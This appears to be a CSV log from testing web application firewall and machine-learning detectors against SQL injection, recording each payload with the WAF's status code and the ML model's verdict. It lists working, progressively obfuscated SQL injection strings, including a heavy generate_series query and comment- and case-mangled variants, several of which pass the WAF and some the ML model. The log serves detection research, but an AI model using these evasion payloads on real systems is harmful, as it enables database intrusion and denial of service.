Timestamp,Payload,WAF_Prediction_Timestamp,WAF_Prediction,ML_Prediction_Timestamp,ML_Prediction
2024-09-03T08:09:30.476952,"1' in boolean mode);select count(*) from generate_series(1,5000000)#",2024-09-03T08:09:30.483252,403,2024-09-03T08:09:33.918817,Rejected
2024-09-03T08:09:33.928036,"'F78'<>'F78A'' in boolean
mode);SelECt/**/count(*) From generate_series((SELECT 1),0x4c4b40)#",2024-09-03T08:09:33.931977,403,2024-09-03T08:09:38.045715,Rejected
2024-09-03T08:09:39.070188,"'F78' NOT LIKE 'F78A''/**/In boolean
mode);SELEcT/**/count(*) froM generate_series((selecT	(SeLecT  AnD 1462<>1463)),0x4c4b40)#L6",2024-09-03T08:09:39.082944,403,2024-09-03T08:09:44.288095,Rejected
2024-09-03T08:09:45.306959,-6081 where 3681=3681 or 2603=3138--,2024-09-03T08:09:45.312644,403,2024-09-03T08:09:46.930817,Rejected
2024-09-03T08:09:46.939661,"-6081 WHerE/**/3681=3681 or  Or 0x0 liKe
'\K'!='\KI'--",2024-09-03T08:09:46.943772,200,2024-09-03T08:09:49.284126,Rejected
2024-09-03T08:09:50.300174,"-0x17c1/**/whErE/**/5222=5222=(SELECT 1) or  or 0x0	LIkE
'\K'!='\KI'--",2024-09-03T08:09:50.303787,403,2024-09-03T08:09:53.415447,Rejected
2024-09-03T08:12:53.217944,-3520%' or 8571=8571--,2024-09-03T08:12:53.222990,403,2024-09-03T08:12:54.642547,Rejected
2024-09-03T08:12:54.651712,"-'W'<>'W:'%'/**/OR
0x217b=(SELECT 1)--",2024-09-03T08:12:54.655844,200,2024-09-03T08:12:56.313029,Rejected
2024-09-03T08:12:57.331949,-'W'!='W:'%'/**/Or	0x217b=(SELeCT (SeleCt 6602)/*!h\*/NOT LIKE (SEleCt 1))--,2024-09-03T08:12:57.338132,200,2024-09-03T08:13:00.518997,Accepted
2024-09-03T08:13:01.542995,-'W' not like 'W:'%'/**/OR	0x217b=(SELEcT (seLecT 6602)/**/NOT	LIKE (SeLect /***/ANd (SELECT 5464) LIKE 5464))--,2024-09-03T08:13:01.551133,200,2024-09-03T08:13:06.046861,Rejected
2024-09-03T08:13:07.072186,"-'W' not like 'W:'%'/**/OR
0x217b=(SELEcT (seLecT 'B{'<>'B{2')/**/NOT	LIKE (selecT /***/And (sELEct (SELecT  or 0)) LIke/**/5464))--",2024-09-03T08:13:07.077384,200,2024-09-03T08:13:12.604825,Rejected
2024-09-03T08:13:13.618066,"-'W' not like 'W:'%'/**/OR
0x217b=(SELEcT (seLecT 'B{'<>'B{2')/**/NOT
LIKE (seleCT /***/aND (sEleCt (sELect  Or 0x0)) LiKE '\ OR 0'='\1'))--",2024-09-03T08:13:13.624275,200,2024-09-03T08:13:19.806855,Rejected
2024-09-03T08:13:20.821545,"-'W' not/**/likE 'W:'%'/*a7y1*/OR
0x217b=(SELEcT (seLecT 'B{'<>'B{'""$'!='""$8'')/**/NOT
LIKE (seleCT /***/aND (sEleCt (sELect	 Or 0x0)) LiKE '\ oR 0x0'='\ OR 0'))--",2024-09-03T08:13:20.825538,200,2024-09-03T08:13:27.448983,Accepted
2024-09-03T08:13:28.467835,"-'W' not/**/lIKe 'W:'%'/*a7y1*/OR
0x217b=(SELEcT (seLecT 'B{'<>'B{'""$'!='""$ OR 0<>13'') NOT
LIKE (seleCT /***/aND (sEleCt (sELect
 Or 0x0)) LiKE '\ || 0x0'='\ oR 0x0'))--",2024-09-03T08:13:28.473820,200,2024-09-03T08:13:35.794310,Accepted
